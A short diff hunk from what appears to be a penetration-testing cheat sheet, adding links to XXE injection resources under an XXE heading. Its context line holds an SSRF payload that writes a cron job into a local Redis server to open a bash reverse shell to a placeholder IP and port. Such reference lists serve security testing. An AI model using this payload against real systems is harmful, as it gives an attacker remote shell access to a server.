@@ -423,8 +423,10 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 ## XXE
 
+- https://github.com/BuffaloWill/oxml_xxe
 - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- 
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-docx-file
+
 --------
 
 **Client**
